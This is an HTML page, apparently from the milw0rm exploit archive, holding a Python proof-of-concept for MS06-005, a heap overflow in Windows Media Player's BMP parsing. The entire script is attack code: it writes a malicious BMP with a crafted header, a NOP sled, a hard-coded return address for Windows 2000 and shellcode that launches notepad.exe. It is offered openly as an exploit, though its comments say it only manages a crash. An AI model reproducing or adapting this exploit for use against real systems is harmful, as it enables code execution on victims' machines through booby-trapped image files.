<html><head><title>Windows Media Player 7.1 <= 10 BMP Heap Overflow PoC (MS06-005) (2)</title></head><pre># sploit creater by redsand@blacksecurity.org
# ms06-005 advisory proof of concept
# heap overflow in wmf.dll @ 0x0035920a
# denial of service, cuz we can't get this to play nice
    
#shamelessly stolen from CANVAS code
def intel_order(i):
    str=&quot;&quot;
    a=chr(i % 256)
    i=i &gt;&gt; 8
    b=chr(i % 256)
    i=i &gt;&gt; 8
    c=chr(i % 256)
    i=i &gt;&gt; 8
    d=chr(i % 256)
    
    str+=&quot;%c%c%c%c&quot; % (a,b,c,d)

    return str

def stroverwrite(instring,overwritestring,offset):
    head=instring[:offset]
    #print head
    tail=instring[offset+len(overwritestring):]
    #print tail
    result=head+overwritestring+tail
    return result


#options
#SEH HAndle

#anything with a call/jmp  edi/ecx + 4 or more
EIP=0x75e1692c # call edi +20 for win2k pro eng in oleaut
DUMMY=0xccccccccL
filename = &quot;rbl4ck-06-005.bmp&quot;

header =  &quot;\x42\x4d\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x28\x00&quot;
header += &quot;\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x04\x00\x00\x00&quot;
header += &quot;\x00\x00\x00\x01\x00\x00\x01\x00\x00\x00\x01\x00\x04\x00\x00\x00&quot;
header += &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\xCC&quot;

c0de    = &quot;\x90&quot; * 350
c0de    +=  &quot;\xCD\x03&quot; 
c0de    += &quot;\xEB\x61\x56\x6A\x30\x59\x64\x8B\x01\x8B\x40\x0C&quot;
c0de    += &quot;\x8B\x70\x1C\xAD\x8B\x40\x08\x5E\xC3\x60\x8B\x6C&quot;
c0de    += &quot;\x24\x24\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B&quot;
c0de    += &quot;\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x34\x49\x8B\x34&quot;
c0de    += &quot;\x8B\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74&quot;
c0de    += &quot;\x07\xC1\xCF\x0D\x01\xC7\xEB\xF4\x3B\x7C\x24\x28&quot;
c0de    += &quot;\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B&quot;
c0de    += &quot;\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24&quot;
c0de    += &quot;\x1C\x61\xC3\xE8\x9A\xFF\xFF\xFF\x68\x98\xFE\x8A&quot;
c0de    += &quot;\x0E\x50\xE8\xA2\xFF\xFF\xFF\xEB\x02\xEB\x05\xE8&quot;
c0de    += &quot;\xF9\xFF\xFF\xFF\x5B\x83\xC3\x1C\x33\xC9\x88\x0B&quot;
c0de    += &quot;\x83\xEB\x0B\x41\x51\x53\xFF\xD0\x90\x6E\x6F\x74&quot;
c0de    += &quot;\x65\x70\x61\x64\x2E\x65\x78\x65\x01&quot;
#tag
c0de    += &quot;0wn3dbyr3ds4nd&quot;

for on in range(256):
    c0de += intel_order(EIP-80)

body = &quot;&quot;
r=0x88888800L
for on in range(235):
    r+=0x01L
    body += intel_order(r)

    
body    += c0de

body = stroverwrite(body,intel_order(EIP-4),56)
body = stroverwrite(body,intel_order(EIP),96)
body = stroverwrite(body,intel_order(EIP),160)
body = stroverwrite(body,intel_order(EIP-0x3c),708)
body = stroverwrite(body,intel_order(EIP),828)
body = stroverwrite(body,intel_order(EIP),868)
body = stroverwrite(body,intel_order(EIP),936)
#
#here's our call eax+4
body = stroverwrite(body,intel_order(EIP-4),948)
#
#
body = stroverwrite(body,intel_order(EIP),300)





print &quot;MS06-005 Heap Overflow by redsand [at] blacksecurity.org&quot;
print &quot;Writing filename &quot; + filename + &quot;...&quot;

try:                                
    fsock = open(filename, &quot;wb+&quot;, 0) 
    try:                           
        fsock.write(header + body ); 
    finally:                        
        fsock.close()
except IOError:                     
    pass


print &quot;success.&quot;

# milw0rm.com [2006-02-16]</pre></html>